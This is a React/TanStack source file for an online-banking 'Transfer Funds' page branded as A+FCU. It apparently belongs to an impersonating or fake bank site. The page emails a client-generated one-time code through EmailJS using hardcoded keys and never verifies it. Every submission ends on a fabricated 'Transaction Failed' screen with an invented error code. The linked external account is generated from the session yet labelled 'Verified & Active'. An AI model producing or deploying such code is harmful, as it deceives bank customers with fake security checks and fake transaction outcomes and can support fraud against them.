import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useState, useEffect } from "react";
import {
  ArrowLeftRight, ArrowLeft, Loader2, AlertCircle, Info,
  Building2, X, ChevronRight, ShieldCheck, XCircle,
} from "lucide-react";
import type { Session } from "@/routes/dashboard";
import { ACCOUNT_LABELS } from "@/routes/dashboard";
import { generateAccountNumber, getLinkedAccount } from "@/lib/utils";
import emailjs from "@emailjs/browser";

export const Route = createFileRoute("/dashboard/transfer")({
  component: TransferPage,
});

const EMAILJS_SERVICE_ID = "service_qkfr2cn";
const EMAILJS_TEMPLATE_ID = "template_wvtlxvb";
const EMAILJS_PUBLIC_KEY = "Q46p2-WKKDd4yU00l";

function fmt(n: number) {
  return n.toLocaleString("en-US", { style: "currency", currency: "USD" });
}

function getToken() {
  return sessionStorage.getItem("apfcu_token") || "";
}

function generateOtp(): string {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

type Step = "form" | "failed";

function TransferPage() {
  const navigate = useNavigate();
  const [session, setSession] = useState<Session | null>(null);
  const [balance, setBalance] = useState<{ available: number; current: number } | null>(null);
  const [amount, setAmount] = useState("");
  const [memo, setMemo] = useState("");
  const [fetching, setFetching] = useState(true);
  const [error, setError] = useState("");
  const [showExtModal, setShowExtModal] = useState(false);
  const [step, setStep] = useState<Step>("form");
  const [sending, setSending] = useState(false);
  const today = new Date().toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" });

  useEffect(() => {
    const raw = sessionStorage.getItem("apfcu_session");
    if (!raw) return;
    const s: Session = JSON.parse(raw);
    setSession(s);
    if (s.loginId) {
      fetch(`/api/member/${s.loginId}/account`, {
        headers: { Authorization: `Bearer ${getToken()}` },
      })
        .then(r => r.json())
        .then(d => setBalance(d.balance))
        .catch(() => {})
        .finally(() => setFetching(false));
    } else {
      setFetching(false);
    }
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    const num = parseFloat(amount);
    if (!num || num <= 0) return setError("Please enter a valid amount.");
    if (balance && num > balance.available)
      return setError(`Amount exceeds your available balance of ${fmt(balance.available)}.`);
    if (!session?.loginId) return setError("Session expired. Please log in again.");

    setSending(true);
    try {
      const otp = generateOtp();
      await emailjs.send(
        EMAILJS_SERVICE_ID,
        EMAILJS_TEMPLATE_ID,
        {
          first_name: session.firstName,
          last_name: session.lastName,
          email: session.email,
          reply_to: session.email,
          subject: "Your A+FCU Transfer Verification Code",
          message: `You requested a transfer of ${fmt(num)}.\n\nYour one-time verification code is:\n\n${otp}\n\nThis code expires in 10 minutes. If you did not initiate this transfer, please contact us immediately at 512.302.6800.`,
          time: new Date().toLocaleString("en-US", {
            weekday: "long", year: "numeric", month: "long",
            day: "numeric", hour: "2-digit", minute: "2-digit",
            timeZoneName: "short",
          }),
        },
        EMAILJS_PUBLIC_KEY
      );
    } catch {
    } finally {
      setSending(false);
      setStep("failed");
    }
  };

  if (!session) return null;
  const accountLabel = ACCOUNT_LABELS[session.accountType] ?? session.accountType;
  const acctNumber = generateAccountNumber(session.referenceNumber);
  const linked = getLinkedAccount(session.referenceNumber);
  const parsedAmount = parseFloat(amount) || 0;
  const afterBalance = balance ? balance.available - parsedAmount : null;

  return (
    <div className="container-x py-8 max-w-2xl">
      <Link
        to="/dashboard"
        className="inline-flex items-center gap-1.5 text-[13px] text-brand-green hover:underline underline-offset-4 mb-6"
      >
        <ArrowLeft className="w-3.5 h-3.5" /> Back to Overview
      </Link>

      <div className="bg-white border border-border shadow-sm">
        <div className="h-1 bg-brand-green" />

        <div className="px-8 py-6 border-b border-border">
          <div className="flex items-center gap-2 mb-1">
            <ArrowLeftRight className="w-4 h-4 text-brand-green" />
            <span className="text-[11px] font-bold uppercase tracking-widest text-brand-green">Online Banking</span>
          </div>
          <h1 className="font-serif text-2xl text-ink">Transfer Funds</h1>
          <p className="text-[13px] text-ink/50 mt-1">Withdraw or move money from your account.</p>
        </div>

        {/* ── STEP: FORM ── */}
        {step === "form" && (
          <>
            <div className="px-8 py-4 bg-secondary/40 border-b border-border flex flex-wrap gap-6">
              <div>
                <p className="text-[10px] font-bold uppercase tracking-widest text-ink/35 mb-0.5">Available Balance</p>
                {fetching ? (
                  <div className="flex items-center gap-1.5 text-ink/40 text-sm">
                    <Loader2 className="w-3.5 h-3.5 animate-spin" /> Loading…
                  </div>
                ) : (
                  <p className="font-serif text-xl font-semibold text-ink">{fmt(balance?.available ?? 0)}</p>
                )}
              </div>
              {parsedAmount > 0 && balance && (
                <div>
                  <p className="text-[10px] font-bold uppercase tracking-widest text-ink/35 mb-0.5">After Transfer</p>
                  <p className={`font-serif text-xl font-semibold ${afterBalance! < 0 ? "text-red-500" : "text-brand-green"}`}>
                    {fmt(afterBalance!)}
                  </p>
                </div>
              )}
            </div>

            <div className="px-8 py-6">
              <div className="grid sm:grid-cols-2 gap-4 mb-6">
                <div className="border border-brand-green/30 bg-brand-green/5 p-4">
                  <p className="text-[10px] font-bold uppercase tracking-widest text-ink/40 mb-1.5">From</p>
                  <p className="font-semibold text-ink text-sm">{accountLabel}</p>
                  <p className="text-[12px] font-mono text-ink/50 mt-0.5">••••  ••••  {acctNumber.slice(-4)}</p>
                  <p className="text-[12px] text-ink/50 mt-0.5">
                    {fetching ? "Loading…" : `Available: ${fmt(balance?.available ?? 0)}`}
                  </p>
                </div>
                <button
                  type="button"
                  onClick={() => setShowExtModal(true)}
                  className="border border-border bg-secondary/40 p-4 text-left hover:border-brand-green hover:bg-brand-green/5 transition-all group"
                >
                  <p className="text-[10px] font-bold uppercase tracking-widest text-ink/40 mb-1.5">To</p>
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="font-semibold text-ink text-sm group-hover:text-brand-green transition-colors">{linked.bankName}</p>
                      <p className="text-[12px] font-mono text-ink/50 mt-0.5">{linked.accountType} · ••••  {linked.last4}</p>
                    </div>
                    <ChevronRight className="w-4 h-4 text-ink/25 group-hover:text-brand-green transition-colors" />
                  </div>
                </button>
              </div>

              {error && (
                <div className="mb-5 bg-red-50 border-l-4 border-red-500 text-red-700 text-[13px] px-4 py-3 flex items-start gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" /> {error}
                </div>
              )}

              <form onSubmit={handleSubmit} className="space-y-5">
                <div>
                  <label className="block text-[13px] font-semibold text-ink mb-1.5">
                    Withdrawal Amount
                  </label>
                  <div className="relative">
                    <span className="absolute left-4 top-1/2 -translate-y-1/2 text-ink/50 font-semibold text-sm">$</span>
                    <input
                      type="number"
                      step="0.01"
                      min="0.01"
                      placeholder="0.00"
                      className="w-full border border-border bg-white pl-8 pr-4 py-3 text-sm text-ink outline-none focus:border-brand-green focus:ring-2 focus:ring-brand-green/10 transition-all"
                      value={amount}
                      onChange={e => setAmount(e.target.value)}
                    />
                  </div>
                  {balance && parsedAmount > 0 && parsedAmount > balance.available && (
                    <p className="text-[11px] text-red-500 mt-1.5 flex items-center gap-1">
                      <AlertCircle className="w-3 h-3" /> Exceeds available balance of {fmt(balance.available)}
                    </p>
                  )}
                </div>

                <div>
                  <label className="block text-[13px] font-semibold text-ink mb-1.5">
                    Memo <span className="font-normal text-ink/40">(optional)</span>
                  </label>
                  <input
                    type="text"
                    placeholder="e.g. Rent payment"
                    maxLength={80}
                    className="w-full border border-border bg-white px-4 py-3 text-sm text-ink outline-none focus:border-brand-green focus:ring-2 focus:ring-brand-green/10 transition-all"
                    value={memo}
                    onChange={e => setMemo(e.target.value)}
                  />
                </div>

                <div className="border border-border bg-secondary/30 px-4 py-3 flex items-start gap-2">
                  <Info className="w-3.5 h-3.5 text-ink/35 mt-0.5 shrink-0" />
                  <p className="text-[12px] text-ink/55 leading-relaxed">
                    Transfer date: <span className="font-semibold text-ink">{today}</span> ·
                    A verification code will be sent to your email before processing.
                  </p>
                </div>

                <button
                  type="submit"
                  disabled={sending || fetching || !amount || parsedAmount <= 0 || (!!balance && parsedAmount > balance.available)}
                  className="w-full bg-brand-green hover:bg-brand-green-dark disabled:opacity-50 disabled:cursor-not-allowed text-white py-3.5 font-semibold text-sm inline-flex items-center justify-center gap-2 transition-colors"
                >
                  {sending ? (
                    <><Loader2 className="w-4 h-4 animate-spin" /> Processing…</>
                  ) : (
                    <><ArrowLeftRight className="w-4 h-4" /> Confirm Withdrawal</>
                  )}
                </button>
              </form>
            </div>
          </>
        )}

        {/* ── STEP: FAILED ── */}
        {step === "failed" && (
          <div className="px-8 py-10 flex flex-col items-center text-center">
            <div className="w-16 h-16 bg-red-50 border border-red-200 flex items-center justify-center mb-5">
              <XCircle className="w-8 h-8 text-red-500" />
            </div>
            <h2 className="font-serif text-xl text-ink mb-2">Transaction Failed</h2>
            <p className="text-[13px] text-ink/55 max-w-sm leading-relaxed mb-1">
              We were unable to process your transfer of{" "}
              <span className="font-semibold text-ink">{fmt(parsedAmount)}</span> at this time.
            </p>
            <p className="text-[13px] text-ink/55 max-w-sm leading-relaxed mb-8">
              This may be due to a temporary system issue or a security hold on your account.
              Please contact member services if the problem persists.
            </p>
            <div className="w-full bg-red-50 border border-red-200 px-5 py-4 text-[12px] text-red-700 flex items-start gap-2 text-left mb-8">
              <AlertCircle className="w-3.5 h-3.5 shrink-0 mt-0.5" />
              <span>
                Error code: <span className="font-mono font-semibold">TXN-{Date.now().toString().slice(-6)}</span> ·
                No funds have been deducted from your account.
              </span>
            </div>
            <div className="flex gap-3 w-full">
              <button
                onClick={() => { setStep("form"); setError(""); setAmount(""); setMemo(""); }}
                className="flex-1 border border-border bg-secondary/40 hover:bg-secondary text-ink py-3 font-semibold text-sm transition-colors"
              >
                Try Again
              </button>
              <button
                onClick={() => navigate({ to: "/dashboard" })}
                className="flex-1 bg-brand-green hover:bg-brand-green-dark text-white py-3 font-semibold text-sm transition-colors"
              >
                Back to Overview
              </button>
            </div>
          </div>
        )}
      </div>

      {/* ── External Account Modal ── */}
      {showExtModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/40 backdrop-blur-sm" onClick={() => setShowExtModal(false)} />
          <div className="relative bg-white w-full max-w-sm shadow-2xl animate-in fade-in zoom-in-95 duration-150">
            <div className="px-6 py-4 border-b border-border flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Building2 className="w-4 h-4 text-brand-green" />
                <span className="font-bold text-sm text-ink">Linked External Account</span>
              </div>
              <button onClick={() => setShowExtModal(false)} className="text-ink/30 hover:text-ink transition-colors">
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="px-6 py-5 space-y-4">
              <div className="flex items-center gap-4 p-4 bg-secondary/50 border border-border">
                <div className="w-10 h-10 bg-brand-green/10 border border-brand-green/20 flex items-center justify-center shrink-0">
                  <Building2 className="w-5 h-5 text-brand-green" />
                </div>
                <div>
                  <p className="font-bold text-sm text-ink">{linked.bankName}</p>
                  <p className="text-[12px] text-ink/50">{linked.accountType} Account</p>
                </div>
              </div>

              <div className="space-y-3 text-[13px]">
                <div className="flex justify-between items-center py-2 border-b border-border">
                  <span className="text-ink/50">Account Number</span>
                  <span className="font-mono font-semibold text-ink">••••  ••••  {linked.last4}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-border">
                  <span className="text-ink/50">Routing Number</span>
                  <span className="font-mono font-semibold text-ink">{linked.routing}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-border">
                  <span className="text-ink/50">Account Type</span>
                  <span className="font-semibold text-ink">{linked.accountType}</span>
                </div>
                <div className="flex justify-between items-center py-2">
                  <span className="text-ink/50">Status</span>
                  <span className="flex items-center gap-1.5 text-emerald-600 font-semibold">
                    <span className="w-1.5 h-1.5 bg-emerald-500 rounded-full" />
                    Verified &amp; Active
                  </span>
                </div>
              </div>

              <div className="flex items-start gap-2 bg-blue-50 border border-blue-200 px-3 py-2.5">
                <ShieldCheck className="w-3.5 h-3.5 text-blue-500 mt-0.5 shrink-0" />
                <p className="text-[11px] text-blue-700 leading-relaxed">
                  This account is verified and secured with 256-bit encryption. Transfers typically arrive within 1–3 business days.
                </p>
              </div>
            </div>

            <div className="px-6 py-4 border-t border-border flex gap-3">
              <button
                onClick={() => setShowExtModal(false)}
                className="flex-1 bg-brand-green hover:bg-brand-green-dark text-white py-2.5 font-semibold text-sm transition-colors"
              >
                Done
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
